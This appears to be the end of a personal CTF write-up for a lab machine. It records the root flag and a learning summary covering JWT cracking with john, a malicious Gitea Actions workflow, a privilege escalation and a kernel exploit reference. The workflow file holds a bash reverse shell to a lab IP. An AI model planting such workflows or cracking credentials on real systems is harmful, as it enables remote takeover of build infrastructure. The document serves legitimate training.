+
+[*] You've Got ROOT:-)
+
+# root
+
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+1  root.txt  script.sh
+
+# cat root.txt
+cat root.txt
+008b138f906537f51a5a5c2c69c4b8a2
+
+---Root User Flag---
+
+
+
+
+
+
+
+
+
+WHAT I LEARNED FROM THIS CTF
+
++ There was a github repository I found that belonged to the victim, and either by checking the
+initial commit or downloading the repo to my machine, going to it's directory and writing:
+
+	git show
+
+I saw the content of the repo and discovered a jwt token.
+
+
++ I learned that jwt tokens can also be cracked via john/hashcat etc:
+
+	john -w=/home/okina/wordlists/rockyou.txt hash.txt
+
+
++ I discovered the credentals of a github repo, so to exploit it I created a new repository which
+was empty, enabled repository action settings and then:
+
+	
+	git clone http://10.0.2.72:3000/dev/revshell.git      
+	
+	ls
+	flask-jwt-auth  revshell  run_linux_os_ctf_writeup.txt
+                                                                                                      
+	cd revshell 
+           
+                                                                                           
+created .gitea/workflows directories and then we put our reverse shell in a yaml file
+
+                                                                                                      
+	nano shell.yaml   
+                      
+                                                                                
+	cat shell.yaml 
+	name: Heimdallr
+	run-name: ${{github.actor}} testing Gitea Action
+	on: [push]
+	jobs:
+  	  Explore-Gitea-Actions:
+   	   runs-on: run
+    	   steps:
+      	     - run: /bin/bash -i >& /dev/tcp/10.0.2.54/1234 0>&1
+                                                                 
+
+
+doing the adjustments I then commit the file into the repository
+
+	git config user.email "dev@run.hmv"             
+                                                                                                      
+	git config user.name "dev"         
+                                                                                                      
+	git add .                 
+                                                                                                      
+	git commit -m "Testing"   
+
+	git push origin main   
+	Username for 'http://10.0.2.72:3000': dev
+	Password for 'http://dev@10.0.2.72:3000': 
+	* [new branch]      main -> main
+                                             
+
+
++ Then opened up a nc listener and learned to run the new repository from the github page
+
+
+
++ Once in the system, we were in a docker and by writing: 
+
+	sudo su -
+
+I became root
+
+
+
++ I learned that by writing the command:
+
+	ip route show
+
+we can see the routing table system, this gives us ideas about the IP addresses of the system
+
+
++ By discovering the IP address of the system I got the idea to run nmap scan on the target machine
+and by doing so I discovered the ssh port was open:
+
+	apt-get install nmap
+
+	nmap 172.18.0.1 -sS -sV -A -T4
+
+	ssh dev@172.18.0.1
+
+
+
++ I learned the commands:
+
+	uname -a  --> checks all the available system information such as kernel name,
+network node hostname, kernel release, kernel version etc.
+
+	uname -r  --> checks only the kernel release, this is used to know the exact version 
+of the kernel running on the system
+
+
+by using "uname -r" I learned the exact kernel version and then found an exploit online to use it
+
+
+
++ Learned of the CVE-2023-32233 exploit that can be used if the target machine's kernel version is
+6.2.0-20-generic
+
+
+Location of exploit --> https://github.com/Liuk3r/CVE-2023-32233
+
+
+
+Tools and methods I have used: nmap, gobuster, john, git commands (show, config, commit, push), 
+sudo -su -, ip route show, uname -r, CVE-2023-32233,
